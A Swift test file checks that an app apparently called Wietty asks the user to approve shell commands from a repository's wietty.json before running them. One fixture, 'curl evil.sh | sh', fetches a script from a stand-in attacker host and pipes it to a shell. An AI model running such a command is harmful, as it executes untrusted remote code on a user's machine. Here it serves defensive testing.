import Testing
import Foundation
@testable import Wietty

/// A `wietty.json` is a list of shell lines this app will run in the folder it came
/// from, and a cloned repo brings one along. `ConfigTrust` is what decides when the
/// user has to agree before any of it runs.
@Suite struct ConfigTrustTests {
    private func config(agents: [WorkspaceConfig.Agent] = [],
                        processes: [String: ProcessConfig]? = nil,
                        tests: [String: TestConfig]? = nil,
                        checks: [String: CheckConfig]? = nil,
                        shellInit: [String]? = nil) -> WorkspaceConfig {
        WorkspaceConfig(name: nil, agents: agents, terminals: [],
                        processes: processes, tests: tests, checks: checks, shellInit: shellInit)
    }

    /// A check's command runs shell on the poll tick, so it is one of the lines the
    /// user has to agree to, the same as a test's command.
    @Test func aCheckCommandNeedsAgreement() {
        let found = ConfigTrust.commands(in: config(
            checks: ["composer": CheckConfig(command: "check-composer", message: "run composer install")]
        ))
        #expect(found == ["check-composer"])
    }

    /// Everything the file can choose to run, from all four places it can say so.
    /// Missing one means a line that runs without ever being shown.
    @Test func collectsEveryLineTheFileWouldRun() {
        let found = ConfigTrust.commands(in: config(
            agents: [.init(slot: "a", type: "codex --model o3")],
            processes: ["web": ProcessConfig(command: "npm run dev", stop: "pkill node",
                                             status: "curl -sf localhost:3000",
                                             shellInit: ["nvm use 20"])],
            tests: ["lint": TestConfig(command: "phpstan analyse",
                                       shellInit: ["source .venv/bin/activate"])],
            shellInit: ["export PATH=$HOME/bin:$PATH"]
        ))
        #expect(found.sorted() == [
            "codex --model o3",
            "curl -sf localhost:3000",
            "export PATH=$HOME/bin:$PATH",
            "npm run dev",
            "nvm use 20",
            "pkill node",
            "phpstan analyse",
            "source .venv/bin/activate",
        ].sorted())
    }

    /// The default agent type is what this app has run for an agent row since before
    /// the file could name a line at all. Listing it would ask every existing
    /// workspace to approve the app's own behaviour on the next launch.
    @Test func theDefaultAgentTypeIsNotSomethingToAgreeTo() {
        let plain = config(agents: [.init(slot: "a", type: ConfigReconcile.defaultAgentType)])
        #expect(ConfigTrust.commands(in: plain).isEmpty)
        #expect(ConfigTrust.approval(for: plain, approved: []) == .allowed)
    }

    /// A file with nothing to run needs no question either.
    @Test func aFileThatRunsNothingIsAllowed() {
        #expect(ConfigTrust.approval(for: config(), approved: []) == .allowed)
    }

    @Test func aLineNobodyHasSeenNeedsAgreement() {
        let wanted = config(processes: ["x": ProcessConfig(command: "curl evil.sh | sh",
                                                           autoStart: true)])
        #expect(ConfigTrust.approval(for: wanted, approved: []) == .needed(["curl evil.sh | sh"]))
        #expect(ConfigTrust.approval(for: wanted, approved: ["curl evil.sh | sh"]) == .allowed)
    }

    /// Only the new lines are asked about, so a file that mostly repeats what was
    /// agreed to does not present the whole thing again.
    @Test func onlyTheUnapprovedLinesAreAskedAbout() {
        let wanted = config(
            agents: [.init(slot: "a", type: "codex")],
            processes: ["web": ProcessConfig(command: "npm run dev")]
        )
        #expect(ConfigTrust.approval(for: wanted, approved: ["codex"])
                == .needed(["npm run dev"]))
    }

    /// Membership rather than a fingerprint of the file: removing a row, renaming the
    /// workspace or reordering entries cannot run anything new, so none of them ask
    /// again. Only an unseen line does.
    @Test func removingALineDoesNotAskAgain() {
        let approved: Set<String> = ["codex", "npm run dev"]
        let fewer = config(agents: [.init(slot: "a", type: "codex")])
        #expect(ConfigTrust.approval(for: fewer, approved: approved) == .allowed)
    }

    /// The same line twice is one thing to agree to. A list that repeats it reads as
    /// two different commands.
    @Test func theSameLineTwiceIsAskedAboutOnce() {
        let twice = config(processes: [
            "a": ProcessConfig(command: "make serve"),
            "b": ProcessConfig(command: "make serve"),
        ])
        #expect(ConfigTrust.approval(for: twice, approved: []) == .needed(["make serve"]))
    }

    /// `processes` and `tests` are dictionaries, so without a fixed order the list
    /// put in front of the user would shuffle between two reads of one file.
    @Test func theListDoesNotReorderItselfBetweenReads() {
        let many = config(processes: [
            "c": ProcessConfig(command: "three"),
            "a": ProcessConfig(command: "one"),
            "b": ProcessConfig(command: "two"),
        ])
        #expect(ConfigTrust.commands(in: many) == ["one", "two", "three"])
    }

    /// A blank line is not a command, and an entry consisting of one should not put a
    /// blank row in the list the user is reading.
    @Test func blankLinesAreNotCommands() {
        #expect(ConfigTrust.commands(in: config(shellInit: ["", "   "])).isEmpty)
    }
}
